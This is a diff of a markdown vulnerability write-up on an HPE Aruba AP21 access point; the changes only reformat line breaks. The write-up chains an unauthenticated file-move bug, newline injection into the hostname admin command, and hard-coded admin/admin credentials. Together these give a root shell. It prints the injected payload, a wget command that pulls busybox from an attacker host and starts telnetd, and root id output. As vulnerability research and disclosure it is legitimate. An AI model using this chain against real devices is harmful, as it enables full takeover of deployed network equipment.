@@ -21,28 +21,20 @@ AP32
 
 ### 1.3 Some special information about the product
 
-My device is AP21.
-
-The Access Points in the AP21 series are used in different scenarios than the Access Points in the AP635 series.
-
-The AP21 series is intended for small businesses.
-
-The firmware of the AP21 series is also different from the firmware of the AP635 series, which is more streamlined.
-
-Access Points for the AP21 series are managed through the cloud at https://portal.instant-on.hpe.com/.
-
-The firmware of this AP21 series is the latest, because it is synchronized through the cloud, and device users cannot update their own devices.
-
+My device is AP21.<br>
+The Access Points in the AP21 series are used in different scenarios than the Access Points in the AP635 series.<br>
+The AP21 series is intended for small businesses.<br>
+The firmware of the AP21 series is also different from the firmware of the AP635 series, which is more streamlined.<br>
+Access Points for the AP21 series are managed through the cloud at https://portal.instant-on.hpe.com/.<br>
+The firmware of this AP21 series is the latest, because it is synchronized through the cloud, and device users cannot update their own devices.<br>
 The latest firmware version is 3.1.0.0
 
-Device users can access only a simple WEB page (as shown in the following figure) to view device information, and cannot perform any management or login operations.
-
+Device users can access only a simple WEB page (as shown in the following figure) to view device information, and cannot perform any management or login operations.<br>
 ![image-20250221210729587](Images/image-20250221210729587.png)
 
 ## 2 Vulnerability exploitation process
 
-The exploitation chain mainly contains three vulnerabilities, plus some tips for exploiting vulnerabilities, and finally obtaining the root shell of the device.
-
+The exploitation chain mainly contains three vulnerabilities, plus some tips for exploiting vulnerabilities, and finally obtaining the root shell of the device.<br>
 The vulnerabilities include the following three:
 
 ```
@@ -60,16 +52,14 @@ Some exploits tips:
 
 Vulnerability exploitation flowchart:
 
-Here is a simplified version of the road map, see the detailed process in Section 4.
-
+Here is a simplified version of the road map, see the detailed process in Section 4.<br>
 ![2](Images/2.png)
 
 ## 3 Vulnerability details
 
 ### 3.1 Unauthorized arbitrary file movement vulnerability
 
-This vulnerability does not require a login.
-
+This vulnerability does not require a login.<br>
 The vulnerability is in the file /aruba/bin/swarm.cgi:
 
 ```
@@ -100,10 +90,8 @@ int __fastcall sub_13C50(int a1)
 }
 ```
 
-When the opcode argument is equal to i18n-upload, different handlers are entered depending on the value of the modern_ui argument.
-
-The vulnerability occurs in the process_i18n_modern function, so we make the modern_ui argument equal to modern_ui.
-
+When the opcode argument is equal to i18n-upload, different handlers are entered depending on the value of the modern_ui argument.<br>
+The vulnerability occurs in the process_i18n_modern function, so we make the modern_ui argument equal to modern_ui.<br>
 Enter the process_i18n_modern function:
 
 ```
@@ -149,22 +137,15 @@ int __fastcall process_i18n_modern(const char *lang, const char *xml_type)
 }
 ```
 
-The most critical flaw is in **[1]**, where strncmp only compares the first two characters of the lang parameter.
-
-This means that we can enter **[2]** as long as the first two characters meet the conditions.
-
-**[2]** concatenates the lang argument into the mv command line and executes it at **[3]**.
-
-This means that we can implement unauthorized movement of arbitrary files within the system by setting the malicious lang parameter.
-
+The most critical flaw is in **[1]**, where strncmp only compares the first two characters of the lang parameter.<br>
+This means that we can enter **[2]** as long as the first two characters meet the conditions.<br>
+**[2]** concatenates the lang argument into the mv command line and executes it at **[3]**.<br>
+This means that we can implement unauthorized movement of arbitrary files within the system by setting the malicious lang parameter.<br>
 ### 3.2 Any management command execution vulnerability after login
 
-A single intra-system arbitrary file movement vulnerability is not enough to get the root shell of a device.
-
-So I kept looking for new vulnerabilities.
-
-Finally, a post-login arbitrary administrative command execution vulnerability was found.
-
+A single intra-system arbitrary file movement vulnerability is not enough to get the root shell of a device.<br>
+So I kept looking for new vulnerabilities.<br>
+Finally, a post-login arbitrary administrative command execution vulnerability was found.<br>
 The vulnerability is in the file /aruba/bin/swarm.cgi:
 
 ```
@@ -240,10 +221,8 @@ void opcode_rest_post_handle(_DWORD *a1, ...)
 }
 ```
 
-Our goal is to enter the rest_api_action_handler function, as long as the api argument satisfies is_vaild_action_api function conditions, I have let the api argument value is hostname.
-
-The is_vaild_action_api function is to ensure that only the administration commands in the whitelist are executed, and the hostname administration command is one of them.
-
+Our goal is to enter the rest_api_action_handler function, as long as the api argument satisfies is_vaild_action_api function conditions, I have let the api argument value is hostname.<br>
+The is_vaild_action_api function is to ensure that only the administration commands in the whitelist are executed, and the hostname administration command is one of them.<br>
 Continue to the rest_api_action_handler function:
 
 ```
@@ -287,10 +266,8 @@ void __fastcall rest_api_action_handler(const char *a1, int a2, int a3, _DWORD *
 }
 ```
 
-It can be seen that **[1]** will concatenate the value of the hostname parameter into the hostname management command, and finally enter **[2]** to execute the hostname management command.
-
-However, the hostname attacker is controllable, and the administrative commands are separated by \n, which means that we can construct malicious hostname parameters to execute arbitrary administrative commands.
-
+It can be seen that **[1]** will concatenate the value of the hostname parameter into the hostname management command, and finally enter **[2]** to execute the hostname management command.<br>
+However, the hostname attacker is controllable, and the administrative commands are separated by \n, which means that we can construct malicious hostname parameters to execute arbitrary administrative commands.<br>
 For example, construct the following malicious hostname parameter:
 
 ```
@@ -304,18 +281,14 @@ hostname 1
 upgrade-modem http://10.0.4.54:8000/debug_modem_sw
 ```
 
-.
-
-The reason we executed the admin command was because we needed to download arbitrary files to the device to match the first arbitrary file movement vulnerability we discovered.
-
+.<br>
+The reason we executed the admin command was because we needed to download arbitrary files to the device to match the first arbitrary file movement vulnerability we discovered.<br>
 The **upgrade-modem** management command can download any file to the **/tmp/modem_img directory** on the system
 
 ### 3.3 Hard-coded login credentials vulnerability
 
-The arbitrary file download vulnerability is a post-login vulnerability, so a login bypass vulnerability needs to be found.
-
-But the AP21 series actually only has a simple page for viewing information, and no login page.
-
+The arbitrary file download vulnerability is a post-login vulnerability, so a login bypass vulnerability needs to be found.<br>
+But the AP21 series actually only has a simple page for viewing information, and no login page.<br>
 But looking at the code in the /aruba/bin/swarm.cgi file, you can see the login api:
 
 ```
@@ -357,38 +330,26 @@ int handle_rest_login(_DWORD *a1, ...)
 }
 ```
 
-I first followed the experience of the AP635 series with **admin/ device serial number ** to call the login api, and found that it failed.
-
+I first followed the experience of the AP635 series with **admin/ device serial number ** to call the login api, and found that it failed.<br>
 Just when I thought my research was over, I tried calling the login api with **admin/admin** and successfully returned sid!
 
-So we found a hard-coded login credentials vulnerability that applies to all AP21 series.
-
+So we found a hard-coded login credentials vulnerability that applies to all AP21 series.<br>
 ## 4 Vulnerability exploitation
 
-Now let's start combining all the vulnerabilities to get the root shell of the device.
-
+Now let's start combining all the vulnerabilities to get the root shell of the device.<br>
 ### 4.1 Upload any file
 
-Run the upgrade-modem management command to upload any file to the /tmp/modem_img directory of the system.
-
-The arbitrary file movement vulnerability can be exploited to move files in the /tmp/modem_img directory anywhere on the device.
-
-This allows you to upload any file to any location in the system.
-
-.
-
-There is a small problem. After the upgrade-modem management command uploadfiles, the files are deleted immediately, leaving no time to move them.
-
-Therefore, I implemented an http server in python to control the file transfer rate, so that after the upgrade-modem management command was executed to upload the file, the file would take a long time to download.
-
-This gives us plenty of time to move the files.
-
+Run the upgrade-modem management command to upload any file to the /tmp/modem_img directory of the system.<br>
+The arbitrary file movement vulnerability can be exploited to move files in the /tmp/modem_img directory anywhere on the device.<br>
+This allows you to upload any file to any location in the system.<br>
+.<br>
+There is a small problem. After the upgrade-modem management command uploadfiles, the files are deleted immediately, leaving no time to move them.<br>
+Therefore, I implemented an http server in python to control the file transfer rate, so that after the upgrade-modem management command was executed to upload the file, the file would take a long time to download.<br>
+This gives us plenty of time to move the files.<br>
 ### 4.2 Execute any system command
 
-We can already upload any file anywhere on the system.
-
-.
-
+We can already upload any file anywhere on the system.<br>
+.<br>
 Let's start with a bit of code in the /aruba/bin/usb_modem_debug file:
 
 ```
@@ -401,12 +362,9 @@ if [ -f /etc/init.d/auto_sw_funcs ]; then
 fi
 ```
 
-When executing the /aruba/bin/usb_modem_debug script file, sh is used to execute the command in the /etc/init.d/auto_sw_funcs file if the /etc/init.d/auto_sw_funcs file exists.
-
-Then we can upload a malicious /etc/init.d/auto_sw_funcs into the system.
-
-.
-
+When executing the /aruba/bin/usb_modem_debug script file, sh is used to execute the command in the /etc/init.d/auto_sw_funcs file if the /etc/init.d/auto_sw_funcs file exists.<br>
+Then we can upload a malicious /etc/init.d/auto_sw_funcs into the system.<br>
+.<br>
 Let's take another look at the code in the /aruba/bin/cli file:
 
 ```
@@ -428,16 +386,11 @@ int __fastcall show_log_usb_cli(int a1, int a2, int a3, _DWORD *a4)
 }
 ```
 
-The show_log_usb_cli function is called when the show log usb management command is executed.
-
-When the /tmp/debug_modem_sw file exists in the system, the /aruba/bin/usb_modem_debug script file is executed.
-
-Then we can upload a malicious /tmp/debug_modem_sw to the system.
-
-.
-
-Combined with this information, you can eventually execute arbitrary system commands.
-
+The show_log_usb_cli function is called when the show log usb management command is executed.<br>
+When the /tmp/debug_modem_sw file exists in the system, the /aruba/bin/usb_modem_debug script file is executed.<br>
+Then we can upload a malicious /tmp/debug_modem_sw to the system.<br>
+.<br>
+Combined with this information, you can eventually execute arbitrary system commands.<br>
 ### 4.3 Vulnerability exploitation process
 
 **Step 1**: Upload /tmp/debug_modem_sw file
@@ -452,8 +405,7 @@ Combined with this information, you can eventually execute arbitrary system comm
 
  (hard-coded login credentials vulnerability + arbitrary administrative command execution vulnerability after login)
 
-.
-
+.<br>
 The command I execute in the auto_sw_funcs file is:
 
 This command can be modified in the exploit_httpserver.py file
@@ -464,8 +416,7 @@ wget http://%s:8888/busybox -O /tmp/busybox;chmod +x /tmp/busybox;/tmp/busybox t
 ''' % get_host_ip()
 ```
 
-This command will open a telnetd port within the device, enter the device and run /tmp/busybox id to see that we have obtained the root shell.
-
+This command will open a telnetd port within the device, enter the device and run /tmp/busybox id to see that we have obtained the root shell.<br>
 ```
 /tmp # /tmp/busybox id
 uid=0(root) gid=0(root)
